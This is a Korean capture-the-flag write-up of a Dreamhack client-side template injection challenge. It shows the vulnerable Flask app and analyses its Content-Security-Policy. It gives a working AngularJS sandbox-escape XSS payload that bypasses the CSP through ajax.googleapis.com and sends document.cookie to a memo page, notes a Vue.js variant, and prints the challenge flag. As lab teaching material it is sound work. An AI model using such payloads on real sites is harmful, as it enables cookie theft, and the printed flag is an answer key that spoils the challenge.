https://honey-push-30b.notion.site/Client-Side-Template-Injection-5e9a6a2853d048c88b0da8b535394f46

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c55cb739-e437-4a80-8925-d0e52da713c2/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

Client Side Template Injection 문제파일을 다운로드 받으면 app.py가 존재한다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template
from selenium import webdriver
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)
nonce = os.urandom(16).hex()

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)

@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response

@app.route("/")
def index():
    return render_template("index.html", nonce=nonce)

@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param

@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'

memo_text = ""

@app.route("/memo")
def memo():
    global memo_text
    text = request.args.get("memo", "")
    memo_text += text + "\n"
    return render_template("memo.html", memo=memo_text, nonce=nonce)

app.run(host="0.0.0.0", port=8000)
```

# 코드 분석 및 공격 설계

```python
def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get("http://127.0.0.1:8000/")
        driver.add_cookie(cookie)
        driver.get(url)
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

def check_xss(param, cookie={"name": "name", "value": "value"}):
    url = f"http://127.0.0.1:8000/vuln?param={urllib.parse.quote(param)}"
    return read_url(url, cookie)
```

사용자로 부터 받은 param을 check_xss함수에서 [http://127.0.0.1:8000/vuln?param=](http://127.0.0.1:8000/vuln?param=) 뒤에 덧붙여서 read_url로 서버에서 실행시킨다.

```python
@app.after_request
def add_header(response):
    global nonce
    response.headers['Content-Security-Policy'] = f"default-src 'self'; img-src https://dreamhack.io; style-src 'self' 'unsafe-inline'; script-src 'nonce-{nonce}' 'unsafe-eval' https://ajax.googleapis.com; object-src 'none'"
    nonce = os.urandom(16).hex()
    return response

```

nonce 값과 CSP 정책을 추가해준다. nonce는 랜덤값이며 CSP 정책은 아래와 같다.

1. 기본적으로 지정되지 않았다면 src경로는 self(같은 오리진)이다.
2. 이미지 경로는 htts://dreamhack.io 이어야한다. 
3. style-src는 self이며 인라인 자바스크립트와 CSS를 허용한다
4. 스크립트 태그는 nonce값이 일치하거나 eval 같은 텍스트-자바스크립트 메커니즘을 허용한다. 이 태그는 [https://ajax.googleapis.com](https://ajax.googleapis.com) 의 출처만을 허용한다.
5. 오브젝트 경로는 허용하지 않는다.

nonce 값은 난수라서 알 수 없기 때문에 nonce를 통해서 스크립트 태그를 실행하기는 힘들고 허용된 출처를 통해서 스크립트를 실행시키자.

```python
@app.route("/vuln")
def vuln():
    param = request.args.get("param", "")
    return param
```

사용자로부터 받는 param 값을 검증없이 리턴해준다.

```python
@app.route("/flag", methods=["GET", "POST"])
def flag():
    if request.method == "GET":
        return render_template("flag.html", nonce=nonce)
    elif request.method == "POST":
        param = request.form.get("param")
        if not check_xss(param, {"name": "flag", "value": FLAG.strip()}):
            return f'<script nonce={nonce}>alert("wrong??");history.go(-1);</script>'

        return f'<script nonce={nonce}>alert("good");history.go(-1);</script>'
```

flag 페이지로, POST로 요청을 받으면 사용자로 부터 받은 param값을 check_xss에 매개변수로 flag값(cookie)과 함께 넘겨준다.

```python
@app.route('/')
def index():
    return render_template('index.html')
```

인덱스 페이지이다.

코드를 살펴보면서 알게 된 핵심은 사용자로 부터 받은 param 값을 제대로 검증을 거치지 않아 xss 취약점이 발생한다는 것이고 이를 보완하기 위하여 CSP 정책을 사용하고 있음을 알 수 있다.

만약 스크립트 태그에서 허용하고 있는 [https://ajax.googleapis.com](https://ajax.googleapis.com) 에서 JSONP callback이 존재하거나 활용할 수 있는 스크립트가 존재한다면 이를 사용할 수 있다. 

여기서 주의해야 할점은 [https://ajax.googleapis.com](https://ajax.googleapis.com) 에서는 오픈 프레임워크인 AngularJS의 템플릿을 사용할 수 있다는 점이다. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8ce4b93e-a6e9-44c3-ad2c-e0a04f38f871/Untitled.png)

 AngularJS 템플릿 예제를 보면 script src가 [https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js](https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js) 로 되어있는 것을 볼 수 있다. 즉 이 경로는 이 문제에서도 CSP 정책을 위반하지 않으면서 템플릿을 삽입시켜 injection을 실행할 수 있다는 것이 된다.

템플릿 컨텍스트 내부의 생성자 함수를 접근하는 방식을 통해 스크립트 코드를 실행시킬 수 있으며 이를 이용하여 서버의 쿠키값인 flag를 얻어내면 된다.(memo페이지에 쓰게한다던지 하는 방법으로)

예를들어 {{constructor.constructor("alert(1)")()}}을 넣어주면 alert(1)이라는 스크립트 코드가 실행이 되게 된다.

만약 Vue.js 템플릿이라면 스크립트 태그는 [https://unpkg.com/vue@3](https://unpkg.com/vue@3) 이 된다. Vue.js의 경우는 {{ _Vue.h.constructor("alert(1)")()}} 이 된다. 

이 문제에서는 AngularJS가 스크립트 태그의 오리진으로 설정되어 있으므로 AngularJS 템플릿의 생성자로 접근한다. 

# 공격

공격 코드는 다음과 같이 구성된다.

1. 먼저 스크립트 태그로 AngularJS 파일을 로드한다. 
2. html 태그나 body태그의 ng-app 속성을 추가하여 AngularJS를 사용함을 알린다. 
3. 생성자를 통해 원하는 스크립트를 실행시킨다.
4. memo페이지에 서버측의 쿠키값(FLAG)를 출력시킬 것이므로 location.href와 document.cookie를 이용한다.

즉 <script src="[https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js](https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js)"></script><html ng-app>{{constructor.constructor("location.href='/memo?memo='+document.cookie")()}}</html> 이 된다.

![인덱스.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f435cdd6-1794-4839-b1c3-445eab18bad7/%EC%9D%B8%EB%8D%B1%EC%8A%A4.png)

인덱스 페이지에서 flag 페이지로 이동하고

![공격.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/330e76f0-7785-4477-b035-9cf9ee028e74/%EA%B3%B5%EA%B2%A9.png)

<script src="[https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js](https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js)"></script><html ng-app>{{constructor.constructor("location.href='/memo?memo='+document.cookie")()}}</html>

를 넣어 공격을 해주면

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f6bd79ce-6b7c-449b-8ed4-d2a9bcc60a05/flag.png)

`DH{741b1b55cfdae94aaaad6c5f1618d167}` 값을 얻을 수 있다.
